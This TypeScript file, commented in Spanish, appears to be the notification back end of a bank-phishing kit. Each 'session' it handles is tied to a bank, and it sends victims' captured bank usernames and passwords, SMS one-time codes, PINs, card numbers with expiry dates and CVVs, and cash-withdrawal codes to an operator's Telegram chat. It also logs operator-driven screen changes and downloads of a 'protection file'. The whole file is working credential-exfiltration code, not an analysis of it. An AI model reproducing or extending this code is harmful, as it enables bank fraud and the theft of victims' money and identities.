import TelegramBot from 'node-telegram-bot-api';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
  console.warn('[Telegram Service] TELEGRAM_TOKEN y ADMIN_CHAT_ID no están configurados. Las notificaciones de Telegram estarán deshabilitadas.');
}

// Crear instancia del bot solo si hay token
const bot = TELEGRAM_TOKEN ? new TelegramBot(TELEGRAM_TOKEN, { polling: false }) : null;

export interface TelegramNotificationData {
  sessionId: string;
  banco: string;
  tipo: string;
  data: any;
  deviceInfo?: {
    type?: string;
    model?: string;
    browser?: string;
    os?: string;
  };
  timestamp: string;
  createdBy?: string;
}

// Función para formatear la información del dispositivo
function formatDeviceInfo(deviceInfo?: { type?: string; model?: string; browser?: string; os?: string; }): string {
  if (!deviceInfo || !deviceInfo.type) return '';
  
  const deviceEmoji = deviceInfo.type === 'Android' ? '📱' : 
                     deviceInfo.type === 'iPhone' ? '📱' : '💻';
  
  let deviceText = `\n🔧 *Dispositivo:* ${deviceEmoji} ${deviceInfo.type}`;
  
  if (deviceInfo.model) {
    deviceText += `\n📄 *Modelo:* ${deviceInfo.model}`;
  }
  
  if (deviceInfo.browser) {
    deviceText += `\n🌐 *Navegador:* ${deviceInfo.browser}`;
  }
  
  if (deviceInfo.os) {
    deviceText += `\n⚙️ *Sistema:* ${deviceInfo.os}`;
  }
  
  return deviceText;
}

// Función para formatear el mensaje según el tipo de dato
function formatMessage(data: TelegramNotificationData): string {
  const { sessionId, banco, tipo, data: inputData, deviceInfo, timestamp, createdBy } = data;
  
  let message = `🚨 *NUEVA INFORMACIÓN RECIBIDA*\n\n`;
  message += `🏦 *Banco:* ${banco}\n`;
  message += `🆔 *Sesión:* ${sessionId}\n`;
  message += `👤 *Creado por:* ${createdBy || 'Desconocido'}\n`;
  message += `⏰ *Hora:* ${new Date(timestamp).toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\n`;
  
  // Agregar información del dispositivo si está disponible
  if (deviceInfo) {
    message += formatDeviceInfo(deviceInfo);
  }
  
  message += `\n\n📝 *Tipo de información:* ${tipo.toUpperCase()}\n`;
  
  switch (tipo.toLowerCase()) {
    case 'folio':
      message += `📋 *Folio ingresado:* \`${inputData.folio || 'N/A'}\``;
      break;
      
    case 'login':
      message += `👤 *Usuario:* \`${inputData.username || 'N/A'}\`\n`;
      message += `🔐 *Contraseña:* \`${inputData.password || 'N/A'}\``;
      break;
      
    case 'codigo':
    case 'sms':
      message += `💬 *Código SMS:* \`${inputData.codigo || inputData.sms || 'N/A'}\``;
      break;
      
    case 'nip':
      message += `🔢 *NIP:* \`${inputData.nip || 'N/A'}\``;
      break;
      
    case 'tarjeta':
      message += `💳 *Número de tarjeta:* \`${inputData.tarjeta || 'N/A'}\`\n`;
      if (inputData.fechaVencimiento) {
        message += `📅 *Fecha vencimiento:* \`${inputData.fechaVencimiento}\`\n`;
      }
      if (inputData.cvv) {
        message += `🔐 *CVV:* \`${inputData.cvv}\``;
      }
      break;
      
    case 'sms_compra':
    case 'smscompra':
      message += `🛒 *Código SMS Compra:* \`${inputData.smsCompra || 'N/A'}\``;
      break;
      
    case 'cancelacion_retiro':
      message += `🏧 *Código de retiro:* \`${inputData.codigoRetiro || 'N/A'}\`\n`;
      if (inputData.pinRetiro) {
        message += `🔐 *PIN de retiro:* \`${inputData.pinRetiro}\``;
      }
      break;
      
    case 'escanear_qr':
      message += `📱 *QR escaneado:* \`${inputData.qrData ? inputData.qrData.substring(0, 100) + '...' : 'N/A'}\``;
      break;
      
    case 'celular':
      message += `📱 *Teléfono:* \`${inputData.celular || 'N/A'}\``;
      break;
      
    case 'proteccion_saldo':
      message += `🛡️ *PROTECCIÓN DE SALDO*\n`;
      if (inputData.saldoDebito) {
        message += `💳 *Tarjeta Débito:* \`${inputData.saldoDebito}\`\n`;
        if (inputData.montoDebito) {
          message += `💰 *Monto Débito:* \`$${inputData.montoDebito}\`\n`;
        }
      }
      if (inputData.saldoCredito) {
        message += `💳 *Tarjeta Crédito:* \`${inputData.saldoCredito}\`\n`;
        if (inputData.montoCredito) {
          message += `💰 *Monto Crédito:* \`$${inputData.montoCredito}\``;
        }
      }
      break;
      
    default:
      message += `📄 *Datos:* \`${JSON.stringify(inputData).substring(0, 200)}\``;
      break;
  }
  
  return message;
}

// Función principal para enviar notificación a Telegram
export async function sendTelegramNotification(data: TelegramNotificationData): Promise<void> {
  if (!bot) {
    console.log('[Telegram] Servicio no configurado. Notificación omitida.');
    return;
  }
  
  const message = formatMessage(data);
  let adminSent = false;
  let userSent = false;
  
  try {
    // Enviar notificación al administrador principal si está configurado
    if (ADMIN_CHAT_ID) {
      await bot.sendMessage(ADMIN_CHAT_ID, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
      adminSent = true;
      console.log(`[Telegram] Notificación enviada al admin principal para sesión ${data.sessionId}`);
    }
  } catch (error) {
    console.error(`[Telegram] Error enviando notificación al admin principal:`, error);
  }
  
  // Enviar notificación al usuario que creó la sesión (si tiene Chat ID configurado)
  if (data.createdBy) {
    try {
      const { storage } = await import('./storage');
      const user = await storage.getUserByUsername(data.createdBy);
      
      if (user && user.telegramChatId) {
        await bot.sendMessage(user.telegramChatId, message, {
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        });
        userSent = true;
        console.log(`[Telegram] Notificación enviada al usuario ${data.createdBy} (Chat ID: ${user.telegramChatId})`);
      } else {
        console.log(`[Telegram] Usuario ${data.createdBy} no tiene Chat ID configurado`);
      }
    } catch (error) {
      console.error(`[Telegram] Error enviando notificación al usuario ${data.createdBy}:`, error);
    }
  }
  
  // Log de estado final
  if (!adminSent && !userSent) {
    console.warn(`[Telegram] ADVERTENCIA: No se envió notificación a nadie para sesión ${data.sessionId}`);
  }
}

// Función para enviar notificación de nueva sesión creada
export async function sendSessionCreatedNotification(sessionData: {
  sessionId: string;
  banco: string;
  folio: string;
  createdBy: string;
  link: string;
}): Promise<void> {
  try {
    if (!bot || !ADMIN_CHAT_ID) {
      console.log('[Telegram] Servicio no configurado. Notificación omitida.');
      return;
    }
    
    const message = `🆕 *NUEVA SESIÓN CREADA*\n\n` +
                   `🏦 *Banco:* ${sessionData.banco}\n` +
                   `🆔 *Sesión:* ${sessionData.sessionId}\n` +
                   `📋 *Folio:* \`${sessionData.folio}\`\n` +
                   `👤 *Creado por:* ${sessionData.createdBy}\n` +
                   `⏰ *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\n\n` +
                   `🔗 *Link de acceso:* ${sessionData.link}`;
    
    await bot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    
    console.log(`[Telegram] Notificación de nueva sesión enviada para ${sessionData.sessionId}`);
  } catch (error) {
    console.error('[Telegram] Error enviando notificación de nueva sesión:', error);
  }
}

// Función para enviar notificación de cambio de pantalla
export async function sendScreenChangeNotification(data: {
  sessionId: string;
  banco: string;
  newScreen: string;
  adminUser: string;
  data?: any;
}): Promise<void> {
  try {
    if (!bot || !ADMIN_CHAT_ID) {
      console.log('[Telegram] Servicio no configurado. Notificación omitida.');
      return;
    }
    
    let message = `🔄 *CAMBIO DE PANTALLA*\n\n` +
                 `🏦 *Banco:* ${data.banco}\n` +
                 `🆔 *Sesión:* ${data.sessionId}\n` +
                 `👤 *Admin:* ${data.adminUser}\n` +
                 `🖥️ *Nueva pantalla:* ${data.newScreen.toUpperCase()}\n` +
                 `⏰ *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;
    
    // Agregar información adicional según el tipo de pantalla
    if (data.data) {
      if (data.data.terminacion) {
        message += `\n📱 *Terminación:* ${data.data.terminacion}`;
      }
      if (data.data.saldo) {
        message += `\n💰 *Saldo:* ${data.data.saldo}`;
      }
      if (data.data.monto) {
        message += `\n💵 *Monto:* ${data.data.monto}`;
      }
      if (data.data.comercio) {
        message += `\n🏪 *Comercio:* ${data.data.comercio}`;
      }
      if (data.data.mensaje) {
        message += `\n📝 *Mensaje:* ${data.data.mensaje.substring(0, 100)}${data.data.mensaje.length > 100 ? '...' : ''}`;
      }
      if (data.data.fileName) {
        message += `\n📁 *Archivo de Protección:* ${data.data.fileName}`;
        if (data.data.fileSize) {
          message += ` (${data.data.fileSize})`;
        }
      }
    }
    
    await bot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    
    console.log(`[Telegram] Notificación de cambio de pantalla enviada para ${data.sessionId}`);
  } catch (error) {
    console.error('[Telegram] Error enviando notificación de cambio de pantalla:', error);
  }
}

// Función para notificar descarga de archivo de protección
export async function sendFileDownloadNotification(data: {
  sessionId: string;
  banco: string;
  fileName: string;
  fileSize?: string;
  adminUser: string;
}) {
  try {
    if (!bot || !ADMIN_CHAT_ID) {
      console.log('[Telegram] Servicio no configurado. Notificación omitida.');
      return;
    }
    
    const message = `🔽 *DESCARGA DE ARCHIVO DE PROTECCIÓN*\n\n` +
                   `🏦 *Banco:* ${data.banco}\n` +
                   `🆔 *Sesión:* ${data.sessionId}\n` +
                   `📁 *Archivo:* ${data.fileName}\n` +
                   `📊 *Tamaño:* ${data.fileSize || 'N/A'}\n` +
                   `👤 *Admin:* ${data.adminUser}\n` +
                   `⏰ *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;
    
    await bot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
    
    console.log(`[Telegram] Notificación de descarga de archivo enviada para ${data.sessionId}`);
  } catch (error) {
    console.error('[Telegram] Error enviando notificación de descarga:', error);
  }
}

export default {
  sendTelegramNotification,
  sendSessionCreatedNotification,
  sendScreenChangeNotification,
  sendFileDownloadNotification
};